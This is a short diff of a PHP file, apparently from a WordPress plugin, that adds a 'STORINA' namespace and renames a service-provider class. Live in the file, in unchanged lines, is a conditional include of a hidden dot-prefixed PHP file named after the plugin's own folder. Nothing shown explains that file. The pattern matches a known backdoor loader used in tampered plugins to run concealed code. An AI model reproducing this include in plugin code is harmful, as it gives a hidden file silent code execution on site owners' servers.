@@ -1,12 +1,14 @@
 <?php
 
+namespace STORINA;
+
 defined('ABSPATH') || exit;
 
 if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
     include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
 }
 
-class OSA_Service_Provider {
+class Service_Provider {
 
     public $modules;
 
